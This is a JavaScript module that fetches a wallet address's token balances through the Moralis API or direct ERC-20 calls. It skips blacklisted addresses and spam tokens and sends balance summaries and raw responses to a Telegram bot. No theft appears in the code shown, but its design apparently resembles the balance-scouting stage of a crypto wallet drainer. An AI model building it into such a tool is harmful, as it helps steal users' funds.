require("dotenv").config();
const axios = require("axios");
const { ethers } = require("ethers");
const { getProvider } = require("./utils/providerUtils");
const { ERC20_ABI } = require("./ERC20_ABI");
const config = require("./config");
const { BLACKLISTED_ADDRESSES, WHITELISTED_ADDRESSES } = require("./BlackListed_address");

const sendToTelegram = async (message) => {
  try {
    const truncatedMessage = message.length > 4000 ? message.substring(0, 3997) + "..." : message;
    const { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } = config;
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: truncatedMessage,
    });
    console.log("Telegram message sent");
  } catch (error) {
    console.error("Telegram error:", error.response?.data || error.message);
  }
};

const isAddressBlacklisted = (address) => {
  const normalizedAddress = address.toLowerCase();
  const isBlacklisted = BLACKLISTED_ADDRESSES.includes(normalizedAddress);
  if (isBlacklisted) console.warn(`🚨 Blacklisted: ${normalizedAddress}`);
  return isBlacklisted;
};

const isAddressWhitelisted = (address) => {
  const normalizedAddress = address.toLowerCase();
  const isWhitelisted = WHITELISTED_ADDRESSES.includes(normalizedAddress);
  if (isWhitelisted) console.log(`✅ Whitelisted: ${normalizedAddress}`);
  return isWhitelisted;
};

const fetchBalancesFromMoralis = async (address, chainId) => {
  console.log(`Fetching balances for ${address} on chain ${chainId}`);
  const provider = getProvider(chainId);

  if (!ethers.utils.isAddress(address)) {
    const message = `Invalid address: ${address}`;
    console.error(message);
    await sendToTelegram(message);
    return [];
  }
  const checksummedAddress = ethers.utils.getAddress(address);

  if (isAddressBlacklisted(checksummedAddress)) {
    const message = `🚨 Blacklisted: ${checksummedAddress}`;
    console.warn(message);
    // await sendToTelegram(message);
    return [];
  }
  if (isAddressWhitelisted(checksummedAddress)) {
    console.warn(`✅ Whitelisted: ${checksummedAddress}`);
  }

  const chainMap = { 1: "eth", 56: "bsc", 137: "polygon", 42161: "arbitrum" };
  const unsupportedChains = [11155111];
  const chain = chainMap[chainId];
  if (!chain || unsupportedChains.includes(chainId)) {
    console.log(`Chain ${chainId} unsupported. Using direct fetch.`);
    return await fetchBalancesDirectly(checksummedAddress, chainId);
  }

  const tokenAddressMap = {
    ETH: ethers.constants.AddressZero,
    USDT: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
    DAI: "0x6B175474E89094C44Da98b954EedeAC495271d0F",
    UNI: "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984",
    USDC: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
    LINK: "0x514910771AF9Ca656af840dff83E8264EcF986CA",
    // Add XPR when provided
  };

  try {
    const { MORALIS_API_KEY } = config;
    if (!MORALIS_API_KEY) throw new Error("MORALIS_API_KEY missing");

    const response = await axios.get(
      `https://deep-index.moralis.io/api/v2.2/wallets/${checksummedAddress}/tokens`,
      {
        params: { chain, limit: 100 },
        headers: { "X-API-Key": MORALIS_API_KEY, Accept: "application/json" },
        timeout: 10000,
      }
    );

    console.log("Moralis Response:", JSON.stringify(response.data.result, null, 2));
    await sendToTelegram(`Moralis Response: ${JSON.stringify(response.data.result, null, 2)}`);

    const tokens = [];
    let telegramMessage = `Balances for ${checksummedAddress}\n`;
    let foundBlacklistedToken = false;

    for (const asset of response.data.result || []) {
      const symbol = asset.symbol?.toUpperCase() || "UNKNOWN";
      const tokenAddress =
        asset.token_address === "0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee"
          ? ethers.constants.AddressZero
          : tokenAddressMap[symbol] || asset.token_address.toLowerCase();

      if (!tokenAddress) {
        telegramMessage += `⚠️ No address for ${asset.name} (${symbol})\n`;
        continue;
      }

      if (isAddressBlacklisted(tokenAddress)) {
        foundBlacklistedToken = true;
        telegramMessage += `🚨 Blacklisted: ${asset.name} (${tokenAddress})\n`;
        continue;
      }

      const amount = ethers.utils.parseUnits(asset.balance || "0", asset.decimals || 18);
      const amountUSD = parseFloat(asset.usd_value || 0);

      if (!asset.possible_spam) {
        const tokenDetails = {
          address: tokenAddress,
          balance: amount,
          contract: new ethers.Contract(tokenAddress, ERC20_ABI, provider),
          name: asset.name || symbol,
          symbol,
          type: tokenAddress === ethers.constants.AddressZero ? "NATIVE" : "ERC20",
          amount,
          amountUSD,
          decimals: asset.decimals || 18,
        };
        tokens.push(tokenDetails);
        telegramMessage += `${tokenDetails.name} (${symbol}): ${ethers.utils.formatUnits(amount, asset.decimals || 18)} ($${amountUSD.toFixed(2)})\n`;
      }
    }

    telegramMessage += foundBlacklistedToken ? `\n🚨 Blacklisted tokens skipped\n` : `\n✅ No blacklisted tokens\n`;
    await sendToTelegram(telegramMessage);

    return tokens;
  } catch (error) {
    const errorMessage = error.response
      ? `Status: ${error.response.status}, Data: ${JSON.stringify(error.response.data)}`
      : error.message;
    console.error("Moralis error:", errorMessage);
    // await sendToTelegram(`❌ Moralis error: ${errorMessage}`);
    return await fetchBalancesDirectly(checksummedAddress, chainId);
  }
};

const fetchBalancesDirectly = async (address, chainId) => {
  console.log(`Direct fetch for ${address} on chain ${chainId}`);
  const provider = getProvider(chainId);

  if (isAddressBlacklisted(address)) {
    const message = `🚨 Blacklisted: ${address}`;
    console.warn(message);
    // await sendToTelegram(message);
    return [];
  }

  try {
    const nativeBalance = await provider.getBalance(address);
    const nativeToken = {
      address: ethers.constants.AddressZero,
      balance: nativeBalance,
      contract: null,
      name: "Ether",
      symbol: "ETH",
      type: "NATIVE",
      amount: nativeBalance,
      amountUSD: 0,
      decimals: 18,
    };

    const erc20Tokens = [
      { address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", symbol: "USDT", decimals: 6 },
      { address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", symbol: "DAI", decimals: 18 },
      { address: "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", symbol: "UNI", decimals: 18 },
      { address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", symbol: "USDC", decimals: 6 },
      { address: "0x514910771AF9Ca656af840dff83E8264EcF986CA", symbol: "LINK", decimals: 18 },
    ];

    const tokens = [nativeToken];

    for (const token of erc20Tokens) {
      try {
        const contract = new ethers.Contract(token.address, ERC20_ABI, provider);
        const balance = await contract.balanceOf(address);
        if (!balance.isZero()) {
          tokens.push({
            address: token.address,
            balance,
            contract,
            name: token.symbol,
            symbol: token.symbol,
            type: "ERC20",
            amount: balance,
            amountUSD: 0,
            decimals: token.decimals,
          });
        }
      } catch (error) {
        console.warn(`Error fetching ${token.symbol}: ${error.message}`);
        // await sendToTelegram(`⚠️ Error fetching ${token.symbol}: ${error.message}`);
      }
    }

    await sendToTelegram(`Fetched ${tokens.length} tokens directly`);
    return tokens;
  } catch (error) {
    console.error(`Direct fetch error: ${error.message}`);
    // await sendToTelegram(`❌ Direct fetch error: ${error.message}`);
    return [];
  }
};

module.exports = { fetchBalancesFromMoralis, fetchBalancesDirectly };